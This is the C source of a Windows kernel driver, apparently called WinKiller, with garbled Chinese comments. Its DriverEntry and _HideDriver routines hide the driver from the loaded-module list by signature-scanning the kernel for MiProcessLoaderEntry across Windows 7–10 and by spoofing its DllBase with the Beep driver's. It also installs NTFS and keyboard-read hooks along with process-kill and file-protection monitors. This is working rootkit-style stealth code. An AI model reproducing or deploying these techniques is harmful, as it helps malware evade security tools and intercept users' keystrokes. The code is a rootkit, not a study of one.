#include "Includes.h"
#include "Functions.h"
#include "Gobal.h"
#include "Undisclosed.h"
#include "DriverDispatch.h"

#if DBG
#include "FsdHook.h"
#include "SSDT.h"
#include "Monitor.h"
#include "IRPCtlFile.h"
#include "DataList.h"
#endif

#ifdef __cplusplus
EXTERN_C_START
#endif // __cplusplus

NTSTATUS DriverEntry(
	IN PDRIVER_OBJECT pDriverObject,
	IN PUNICODE_STRING pRegistryPath
);

NTSTATUS CreateDevice(
	IN PDRIVER_OBJECT pDriverObject
);

BOOLEAN HideDriver(
	IN PDRIVER_OBJECT pDrvObj
);

PVOID GetProcAddress(
	IN PWCHAR FuncName
);

MiProcessLoaderEntry Get_MiProcessLoaderEntry_WIN_7(
	VOID
);

MiProcessLoaderEntry Get_MiProcessLoaderEntry_WIN_8(
	VOID
);

MiProcessLoaderEntry Get_MiProcessLoaderEntry_WIN_8_1(
	VOID
);

MiProcessLoaderEntry Get_MiProcessLoaderEntry_WIN_10(
	VOID
);

MiProcessLoaderEntry Get_MiProcessLoaderEntry(
	VOID
);

BOOLEAN SupportSEH(
	IN PDRIVER_OBJECT DriverObject
);

VOID InitInLoadOrderLinks(
	IN PLDR_DATA_TABLE_ENTRY LdrEntry
);

VOID _HideDriver(
	IN PDRIVER_OBJECT DriverObject,
	IN PVOID Context,
	IN ULONG Count
);

#ifdef __cplusplus
EXTERN_C_END
#endif // _cplusplus

#ifdef ALLOC_PRAGMA
#pragma alloc_text (INIT, DriverEntry)
#pragma alloc_text (INIT, CreateDevice)
#pragma alloc_text (INIT, HideDriver)
#pragma alloc_text (INIT, GetProcAddress)
#pragma alloc_text (INIT, Get_MiProcessLoaderEntry_WIN_7)
#pragma alloc_text (INIT, Get_MiProcessLoaderEntry_WIN_8)
#pragma alloc_text (INIT, Get_MiProcessLoaderEntry_WIN_8_1)
#pragma alloc_text (INIT, Get_MiProcessLoaderEntry_WIN_10)
#pragma alloc_text (INIT, Get_MiProcessLoaderEntry)
#pragma alloc_text (INIT, SupportSEH)
#pragma alloc_text (INIT, InitInLoadOrderLinks)
#pragma alloc_text (INIT, _HideDriver)
#endif

PVOID GetProcAddress(
	IN PWCHAR FuncName
)
{
	UNICODE_STRING u_FuncName = { 0 };
	RtlInitUnicodeString(&u_FuncName, FuncName);
	return MmGetSystemRoutineAddress(&u_FuncName);
}

//��Windows 7��ϵͳ��ȥ����MiProcessLoaderEntry����
MiProcessLoaderEntry Get_MiProcessLoaderEntry_WIN_7(
	VOID
)
{
	//���Search_Code����MiProcessLoaderEntry��������ǰ��Ĳ�����
	//WIN7����������Ȥ��MiProcessLoaderEntry�����������EtwWriteString������ǰ�漸������
	//����ֱ������EtwWriteString����Ȼ����ǰ��������
	CHAR Search_Code[] = "\x48\x89\x5C\x24\x08"			//mov     [rsp+arg_0], rbx
		"\x48\x89\x6C\x24\x18"			//mov     [rsp+arg_10], rbp
		"\x48\x89\x74\x24\x20"			//mov     [rsp+arg_18], rsi
		"\x57"							//push    rdi
		"\x41\x54"						//push    r12
		"\x41\x55"						//push    r13
		"\x41\x56"						//push    r14
		"\x41\x57";					//push    r15
	ULONG_PTR EtwWriteStringAddress = 0;
	ULONG_PTR StartAddress = 0;

	EtwWriteStringAddress = (ULONG_PTR)GetProcAddress(L"EtwWriteString");
	StartAddress = EtwWriteStringAddress - 0x1000;
	if (EtwWriteStringAddress == 0)
		return NULL;

	while (StartAddress < EtwWriteStringAddress)
	{
		if (memcmp((CHAR*)StartAddress, Search_Code, strlen(Search_Code)) == 0)
			return (MiProcessLoaderEntry)StartAddress;
		++StartAddress;
	}

	return NULL;
}

//��Windows 8��ϵͳ��ȥ����MiProcessLoaderEntry����
MiProcessLoaderEntry Get_MiProcessLoaderEntry_WIN_8(
	VOID
)
{
	CHAR Search_Code[] = "\x48\x89\x5C\x24\x08"			//mov     [rsp+arg_0], rbx
		"\x48\x89\x6C\x24\x10"			//mov     [rsp+arg_10], rbp
		"\x48\x89\x74\x24\x18"			//mov     [rsp+arg_18], rsi
		"\x57"							//push    rdi
		"\x48\x83\xEC\x20"				//sub	  rsp, 20h
		"\x48\x8B\xD9";				//mov     rbx, rcx
	ULONG_PTR IoInvalidateDeviceRelationsAddress = 0;
	ULONG_PTR StartAddress = 0;

	IoInvalidateDeviceRelationsAddress = (ULONG_PTR)GetProcAddress(L"IoInvalidateDeviceRelations");
	StartAddress = IoInvalidateDeviceRelationsAddress - 0x1000;
	if (IoInvalidateDeviceRelationsAddress == 0)
		return NULL;

	while (StartAddress < IoInvalidateDeviceRelationsAddress)
	{
		if (memcmp((CHAR*)StartAddress, Search_Code, strlen(Search_Code)) == 0)
			return (MiProcessLoaderEntry)StartAddress;
		++StartAddress;
	}

	return NULL;
}

//��Windows 8.1��ϵͳ��ȥ����MiProcessLoaderEntry����
MiProcessLoaderEntry Get_MiProcessLoaderEntry_WIN_8_1(
	VOID
)
{
	//IoLoadCrashDumpDriver -> MmLoadSystemImage -> MiProcessLoaderEntry
	//MmUnloadSystemImage -> MiUnloadSystemImage -> MiProcessLoaderEntry
	//��WIN10��MmUnloadSystemImage�ǵ����ģ�WIN8.1��δ����������ֻ������һ��·�ӣ�����IoLoadCrashDumpDriver�ǵ�����

	//��IoLoadCrashDumpDriver����������������Code
	CHAR IoLoadCrashDumpDriver_Code[] = "\x48\x8B\xD0"				//mov     rdx, rax
		"\xE8";						//call	  *******
//��MmLoadSystemImage����������������Code
	CHAR MmLoadSystemImage_Code[] = "\x41\x8B\xD6"					//mov     edx, r14d
		"\x48\x8B\xCE"					//mov	  rcx, rsi
		"\x41\x83\xCC\x04"				//or	  r12d, 4
		"\xE8";							//call    *******
	ULONG_PTR IoLoadCrashDumpDriverAddress = 0;
	ULONG_PTR MmLoadSystemImageAddress = 0;
	ULONG_PTR StartAddress = 0;

	IoLoadCrashDumpDriverAddress = (ULONG_PTR)GetProcAddress(L"IoLoadCrashDumpDriver");
	StartAddress = IoLoadCrashDumpDriverAddress;
	if (IoLoadCrashDumpDriverAddress == 0)
		return NULL;

	while (StartAddress < IoLoadCrashDumpDriverAddress + 0x500)
	{
		if (memcmp((VOID*)StartAddress, IoLoadCrashDumpDriver_Code, strlen(IoLoadCrashDumpDriver_Code)) == 0)
		{
			StartAddress += strlen(IoLoadCrashDumpDriver_Code);								//����һֱ��call��code
			MmLoadSystemImageAddress = *(LONG*)StartAddress + StartAddress + 4;
			break;
		}
		++StartAddress;
	}

	StartAddress = MmLoadSystemImageAddress;
	if (MmLoadSystemImageAddress == 0)
		return NULL;

	while (StartAddress < MmLoadSystemImageAddress + 0x500)
	{
		if (memcmp((VOID*)StartAddress, MmLoadSystemImage_Code, strlen(MmLoadSystemImage_Code)) == 0)
		{
			StartAddress += strlen(MmLoadSystemImage_Code);								 //����һֱ��call��code
			return (MiProcessLoaderEntry)(*(LONG*)StartAddress + StartAddress + 4);
		}
		++StartAddress;
	}

	return NULL;
}

//��Windows 10��ϵͳ��ȥ����MiProcessLoaderEntry����
MiProcessLoaderEntry Get_MiProcessLoaderEntry_WIN_10(
	VOID
)
{
	//MmUnloadSystemImage -> MiUnloadSystemImage -> MiProcessLoaderEntry

	//��MmUnloadSystemImage������������Code
	CHAR MmUnloadSystemImage_Code[] = "\x83\xCA\xFF"				//or      edx, 0FFFFFFFFh
		"\x48\x8B\xCF"				//mov     rcx, rdi
		"\x48\x8B\xD8"				//mov     rbx, rax
		"\xE8";						//call    *******
/*
//��MiUnloadSystemImage������������Code
CHAR MiUnloadSystemImage_Code[] = "\x45\x33\xFF"				//xor     r15d, r15d
								  "\x4C\x39\x3F"				//cmp     [rdi], r15
								  "\x74\x18"					//jz      short
								  "\x33\xD2"					//xor     edx, edx
								  "\x48\x8B\xCF"				//mov     rcx, rdi
								  "\xE8";						//call	  *******
*/
	ULONG_PTR MmUnloadSystemImageAddress = 0;
	ULONG_PTR MiUnloadSystemImageAddress = 0;
	ULONG_PTR StartAddress = 0;

	MmUnloadSystemImageAddress = (ULONG_PTR)GetProcAddress(L"MmUnloadSystemImage");
	StartAddress = MmUnloadSystemImageAddress;
	if (MmUnloadSystemImageAddress == 0)
		return NULL;

	while (StartAddress < MmUnloadSystemImageAddress + 0x500)
	{
		if (memcmp((VOID*)StartAddress, MmUnloadSystemImage_Code, strlen(MmUnloadSystemImage_Code)) == 0)
		{
			StartAddress += strlen(MmUnloadSystemImage_Code);								//����һֱ��call��code
			MiUnloadSystemImageAddress = *(LONG*)StartAddress + StartAddress + 4;
			break;
		}
		++StartAddress;
	}

	StartAddress = MiUnloadSystemImageAddress;
	if (MiUnloadSystemImageAddress == 0)
		return NULL;

	while (StartAddress < MiUnloadSystemImageAddress + 0x600)
	{
		//����ntoskrnl���Կ��������ڲ�ͬ�汾��win10��call MiProcessLoaderEntryǰ��Ĳ�����ͬ
		//����ÿ��call MiProcessLoaderEntry֮�󶼻�mov eax, dword ptr cs:PerfGlobalGroupMask
		//�����������0xEB(call) , 0x8B 0x05(mov eax)��Ϊ������

		/*if (memcmp((VOID*)StartAddress, MiUnloadSystemImage_Code, strlen(MiUnloadSystemImage_Code)) == 0)
		{
			StartAddress += strlen(MiUnloadSystemImage_Code);								 //����һֱ��call��code
			return (MiProcessLoaderEntry)(*(LONG*)StartAddress + StartAddress + 4);
		}*/
		if (*(UCHAR*)StartAddress == 0xE8 &&												//call
			*(UCHAR*)(StartAddress + 5) == 0x8B && *(UCHAR*)(StartAddress + 6) == 0x05)	//mov eax,
		{
			StartAddress++;																	//����call��0xE8
			return (MiProcessLoaderEntry)(*(LONG*)StartAddress + StartAddress + 4);
		}
		++StartAddress;
	}

	return NULL;
}

//����ϵͳ�жϵ����ĸ�����
MiProcessLoaderEntry Get_MiProcessLoaderEntry(
	VOID
)
{
	MiProcessLoaderEntry m_MiProcessLoaderEntry = NULL;
	RTL_OSVERSIONINFOEXW OsVersion = { 0 };
	NTSTATUS Status = STATUS_SUCCESS;

	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
	Status = RtlGetVersion((PRTL_OSVERSIONINFOW)(&OsVersion));
	if (!NT_SUCCESS(Status))
	{
		PrintErr("��ȡϵͳ�汾ʧ��! Errorcode: %X\n", Status);
		return NULL;
	}

	if (OsVersion.dwMajorVersion == 10)								//�����Windows 10
	{
		m_MiProcessLoaderEntry = Get_MiProcessLoaderEntry_WIN_10();
		PrintIfm("ϵͳ�汾: Windows 10 %d\n", OsVersion.dwBuildNumber);
		if (m_MiProcessLoaderEntry == NULL)
			PrintErr("��ȡ����MiProcessLoaderEntry!\n");
		else
			PrintSuc("MiProcessLoaderEntry��ַ�ǣ�%p\n", (LPVOID)m_MiProcessLoaderEntry);

		return m_MiProcessLoaderEntry;
	}
	else if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 3)
	{
		m_MiProcessLoaderEntry = Get_MiProcessLoaderEntry_WIN_8_1();
		PrintIfm("ϵͳ�汾: Windows 8.1\n");
		if (m_MiProcessLoaderEntry == NULL)
			PrintErr("��ȡ����MiProcessLoaderEntry!\n");
		else
			PrintSuc("MiProcessLoaderEntry��ַ�ǣ�%p\n", (LPVOID)m_MiProcessLoaderEntry);

		return m_MiProcessLoaderEntry;
	}
	else if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 2 && OsVersion.wProductType == VER_NT_WORKSTATION)		//�����Ϊ������Windows 8��Windows Server 2012
	{
		m_MiProcessLoaderEntry = Get_MiProcessLoaderEntry_WIN_8();
		PrintIfm("ϵͳ�汾: Windows 8\n");
		if (m_MiProcessLoaderEntry == NULL)
			PrintErr("��ȡ����MiProcessLoaderEntry!\n");
		else
			PrintSuc("MiProcessLoaderEntry��ַ�ǣ�%p\n", (LPVOID)m_MiProcessLoaderEntry);

		return m_MiProcessLoaderEntry;
	}
	else if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1 && OsVersion.wProductType == VER_NT_WORKSTATION)		//�����Ϊ������Windows 7��Windows Server 2008 R2
	{
		m_MiProcessLoaderEntry = Get_MiProcessLoaderEntry_WIN_7();
		PrintIfm("ϵͳ�汾: Windows 7\n");
		if (m_MiProcessLoaderEntry == NULL)
			PrintErr("��ȡ����MiProcessLoaderEntry!\n");
		else
			PrintSuc("MiProcessLoaderEntry��ַ�ǣ�%p\n", (LPVOID)m_MiProcessLoaderEntry);

		return m_MiProcessLoaderEntry;
	}

	PrintErr("��֧�ֵ�ϵͳ�汾!\n");
	return NULL;
}

BOOLEAN SupportSEH(
	IN PDRIVER_OBJECT DriverObject
)
{
	//��Ϊ������������ժ��֮��Ͳ���֧��SEH��
	//������SEH�ַ��Ǹ��ݴ������ϻ�ȡ������ַ���ж��쳣�ĵ�ַ�Ƿ��ڸ�������
	//��Ϊ������û�ˣ��ͻ������
	//ѧϰ����Ϯ�����ķ������ñ��˵�����������������ϵĵ�ַ

	PDRIVER_OBJECT BeepDriverObject = NULL;;
	PLDR_DATA_TABLE_ENTRY LdrEntry = NULL;

	NTSTATUS ntStatus = GetDriverObjectByName(&BeepDriverObject, L"\\Driver\\Beep");
	if (BeepDriverObject == NULL || !NT_SUCCESS(ntStatus))
		return FALSE;

	//MiProcessLoaderEntry��������ڲ������Ldr�е�DllBaseȻ��ȥRtlxRemoveInvertedFunctionTable�����ҵ���Ӧ����
	//֮�����Ƴ��������ݲ�������..�������û�е�DllBase��û������SEH������ԭ��û��...
	//����������ϵͳ��Driver\\Beep��������...
	LdrEntry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
	LdrEntry->DllBase = BeepDriverObject->DriverStart;
	ObDereferenceObject(BeepDriverObject);
	return TRUE;
}

VOID InitInLoadOrderLinks(
	IN PLDR_DATA_TABLE_ENTRY LdrEntry
)
{
	InitializeListHead(&LdrEntry->InLoadOrderLinks);
	InitializeListHead(&LdrEntry->InMemoryOrderLinks);
}

VOID _HideDriver(
	IN PDRIVER_OBJECT DriverObject,
	IN PVOID Context,
	IN ULONG Count
)
{
	MiProcessLoaderEntry m_MiProcessLoaderEntry = NULL;
	BOOLEAN bFlag = FALSE;

	m_MiProcessLoaderEntry = Get_MiProcessLoaderEntry();
	if (m_MiProcessLoaderEntry == NULL)
		return;

	bFlag = SupportSEH(DriverObject);
	if (bFlag)
		PrintSuc("SEH �ָ��ɹ�!\n");
	else
		PrintErr("SEH �ָ�ʧ��!\n");

	m_MiProcessLoaderEntry(DriverObject->DriverSection, 0);
	InitInLoadOrderLinks((PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection);

	DriverObject->DriverSection = NULL;
	DriverObject->DriverStart = NULL;
	DriverObject->DriverSize = 0;
	DriverObject->DriverUnload = NULL;
	DriverObject->DriverInit = NULL;
	DriverObject->DeviceObject = NULL;

#ifdef DBG
	PULONG SEH = NULL;
	__try
	{
		*SEH = 0xFF;
	}
	__except (1)
	{
		PrintSuc("SEH ʵ��ɹ�!\n");
	}
#endif

	return;
}

BOOLEAN HideDriver(
	IN PDRIVER_OBJECT pDrvObj
)
{
	if (pDrvObj->DriverSection != NULL)
	{
		PLIST_ENTRY nextSection = ((PLIST_ENTRY)pDrvObj->DriverSection)->Blink;
		RemoveEntryList((PLIST_ENTRY)pDrvObj->DriverSection);
		pDrvObj->DriverSection = nextSection;

		return TRUE;
	}
	return FALSE;
}

NTSTATUS CreateDevice(
	IN PDRIVER_OBJECT pDriverObject
)
{
	NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;

	ntStatus = IoCreateDevice(pDriverObject, 0, &g_usDevName,				//����һ���豸
		FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN,
		TRUE, &g_pCreateDevice);
	if (!NT_SUCCESS(ntStatus))												//��������
		return ntStatus;

	g_pCreateDevice->Flags |= DO_BUFFERED_IO;								//����BUFFERED

	IoDeleteSymbolicLink(&g_usSymName);										//��ɾ��
	ntStatus = IoCreateSymbolicLink(&g_usSymName, &g_usDevName);			//������������
	if (!NT_SUCCESS(ntStatus))												//��������
	{
		IoDeleteDevice(g_pCreateDevice);
		return ntStatus;
	}

	return ntStatus;
}

NTSTATUS DriverEntry(
	IN PDRIVER_OBJECT pDriverObject,
	IN PUNICODE_STRING pRegistryPath
)
{
	if (!pDriverObject || !pRegistryPath)
		return STATUS_INVALID_PARAMETER;

	PrintIfm("DriverEntry Called!\n");
	NTSTATUS ntStatus = STATUS_SUCCESS;
	IoRegisterDriverReinitialization(pDriverObject, _HideDriver, NULL);

	ntStatus = CreateDevice(pDriverObject);
	if (NT_SUCCESS(ntStatus))
		PrintSuc("CreateDevice Success!\n");
	else
		PrintErr("CreateDevice Fail! Errorcode:%X\n", ntStatus);

	for (SIZE_T i = 0; i < IRP_MJ_MAXIMUM_FUNCTION + 1; i++)
		pDriverObject->MajorFunction[i] = DefaultDispatch;

	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControlDispatch;
	pDriverObject->MajorFunction[IRP_MJ_CREATE] = CreateDispatch;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = pDriverObject->MajorFunction[IRP_MJ_CLEANUP] = CloseDispatch;

	PLDR_DATA_TABLE_ENTRY ldrDataTable;
	ldrDataTable = (PLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;
	ldrDataTable->Flags |= 0x20;

	g_uniRegistryPath.Buffer = (PWCHAR)ExAllocatePoolWithTag(NonPagedPool, pRegistryPath->Length, 'PR');
	if (g_uniRegistryPath.Buffer)
	{
		memcpy(g_uniRegistryPath.Buffer, pRegistryPath->Buffer, pRegistryPath->Length);
		g_uniRegistryPath.MaximumLength = g_uniRegistryPath.Length = pRegistryPath->Length;
		PrintSuc("Copy Registry String Success!\n");
	}
	else
	{
		ntStatus = STATUS_MEMORY_NOT_ALLOCATED;
		PrintErr("Copy Registry String Fail!\n");
	}

	//MessageBox(L"�˳�����WinKiller����!This program is made by WinKiller!", L"A MESSAGE FROM DRIVER", (0x00000000L | 0x00000040L | 0x00010000L), 7, &ntStatus);
	//if (NT_SUCCESS(ntStatus))
	//	KdPrint(("[+] MessageBox Success!\n"));
	//else
	//	KdPrint(("[-] MessageBox Fail! Errorcode:%X\n", ntStatus));

	if (HideDriver(pDriverObject))
		PrintSuc("Hide Driver Success!\n");
	else
		PrintErr("Hide Driver Fail!\n");

	if (*InitSafeBootMode > 0)
		PrintIfm("WE ARE IN SAFEMODE!\n");

	InitializeListHead(&g_KillKeyList);
	InitializeListHead(&g_ProtDirList);
	InitializeListHead(&g_ProtFileList);
	InitializeListHead(&g_KillProcList);
	InitializeListHead(&g_ProtProcList);
	InitializeListHead(&g_KillSysList);
	InitializeListHead(&g_KillDllList);

	Mon_CreateFileMon(TRUE);
	Mon_CreateMoudleMon(TRUE);
	Mon_CreateProcKillMon(TRUE);
	Mon_CreateProcMon(TRUE);
	Mon_CreateRegMon(TRUE);
	Mon_CreateThrMon(TRUE);
	FsdHook_HookNtfsCreate();
	FsdHook_HookNtfsDirectoryControl();
	FsdHook_HookNtfsSetIfm();
	FsdHook_HookKeyboardRead();

	pDriverObject->Flags &= ~DO_DEVICE_INITIALIZING;

	return ntStatus;
}